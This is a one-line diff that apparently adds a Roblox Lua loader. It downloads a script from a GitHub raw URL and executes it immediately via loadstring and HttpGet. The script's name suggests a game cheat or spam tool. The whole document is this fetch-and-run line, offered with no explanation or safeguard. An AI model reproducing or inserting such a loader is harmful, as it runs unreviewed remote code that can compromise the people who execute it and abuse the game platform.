@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/realistic-phone-drop-test-scooters-spam7-e587q6buona1gk.lua"))()
